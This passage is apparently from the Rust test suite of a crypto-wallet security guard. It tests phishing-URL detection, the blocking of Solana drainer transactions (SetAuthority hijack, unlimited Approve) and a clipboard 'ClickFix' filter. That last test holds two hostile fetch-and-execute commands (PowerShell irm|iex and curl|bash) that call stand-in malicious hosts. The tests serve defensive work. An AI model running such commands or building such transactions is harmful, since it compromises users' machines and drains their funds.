        let typo_phantom = check_phishing_url("https://phanton.app/download");
        assert_eq!(typo_phantom.risk_level, SecurityRiskLevel::CriticalBlock);
        assert!(typo_phantom.blocked);
        assert_eq!(typo_phantom.targeted_brand.as_deref(), Some("Phantom Wallet"));

        // Subdomain lure + brand spoofing
        let claim_lure = check_phishing_url("https://claim-jup-ag.com/airdrop");
        assert_eq!(claim_lure.risk_level, SecurityRiskLevel::CriticalBlock);
        assert!(claim_lure.blocked);
    }

    #[test]
    fn test_tx_simulator_blocks_set_authority_and_approve_and_nonce_drainers() {
        let user_wallet = "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU".to_string();

        // 1. SetAuthority ownership hijack must be blocked
        let hijack_req = SolanaTxSimulationRequest {
            origin_url: Some("https://jup.ag".to_string()),
            signer_wallet: user_wallet.clone(),
            wallet_sol_balance_lamports: 10_000_000_000,
            instructions: vec![SimulatedInstruction {
                program_id: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA".to_string(),
                instruction_type: "SetAuthority".to_string(),
                authority_type: Some("AccountOwner".to_string()),
                new_authority: Some("DrainerAttacker1111111111111111111111111111".to_string()),
                delegate: None,
                destination: None,
                amount: None,
                token_mint: Some("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v".to_string()),
                is_unlimited_approval: None,
            }],
            raw_payload_preview: None,
        };
        let hijack_res = simulate_and_verify_transaction(&hijack_req);
        assert_eq!(hijack_res.risk_level, SecurityRiskLevel::CriticalBlock);
        assert!(hijack_res.blocked);

        // 2. Unlimited SPL Approve to unknown delegate must be blocked
        let approve_req = SolanaTxSimulationRequest {
            origin_url: None,
            signer_wallet: user_wallet.clone(),
            wallet_sol_balance_lamports: 5_000_000_000,
            instructions: vec![SimulatedInstruction {
                program_id: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA".to_string(),
                instruction_type: "Approve".to_string(),
                authority_type: None,
                new_authority: None,
                delegate: Some("MaliciousDelegate999999999999999999999999999".to_string()),
                destination: None,
                amount: Some(u64::MAX),
                token_mint: Some("So11111111111111111111111111111111111111112".to_string()),
                is_unlimited_approval: Some(true),
            }],
            raw_payload_preview: None,
        };
        let approve_res = simulate_and_verify_transaction(&approve_req);
        assert_eq!(approve_res.risk_level, SecurityRiskLevel::CriticalBlock);
        assert!(approve_res.blocked);

        // 3. Legitimate Jupiter Swap passes safely
        let legit_swap = SolanaTxSimulationRequest {
            origin_url: Some("https://jup.ag".to_string()),
            signer_wallet: user_wallet,
            wallet_sol_balance_lamports: 10_000_000_000,
            instructions: vec![SimulatedInstruction {
                program_id: "JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4".to_string(),
                instruction_type: "Swap".to_string(),
                authority_type: None,
                new_authority: None,
                delegate: None,
                destination: None,
                amount: Some(1_000_000_000),
                token_mint: None,
                is_unlimited_approval: None,
            }],
            raw_payload_preview: None,
        };
        let swap_res = simulate_and_verify_transaction(&legit_swap);
        assert_eq!(swap_res.risk_level, SecurityRiskLevel::Safe);
        assert!(!swap_res.blocked);
    }

    #[test]
    fn test_clickfix_guard_blocks_powershell_and_curl_pipe() {
        let clickfix_ps = "powershell.exe -w hidden -c \"irm https://verify-human-captcha.top/patch.ps1 | iex\" # I am not a robot - Cloudflare Verification ID: 8941";
        let res = inspect_clipboard_clickfix(clickfix_ps);
        assert_eq!(res.risk_level, SecurityRiskLevel::CriticalBlock);
        assert!(res.blocked);

        let clickfix_posix = "curl -sSL https://fix-node-captcha.xyz/install.sh | bash";
        let res2 = inspect_clipboard_clickfix(clickfix_posix);
        assert_eq!(res2.risk_level, SecurityRiskLevel::CriticalBlock);
        assert!(res2.blocked);

        let normal_copy = "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU";
        let res3 = inspect_clipboard_clickfix(normal_copy);
        assert_eq!(res3.risk_level, SecurityRiskLevel::Safe);
        assert!(!res3.blocked);
    }
}
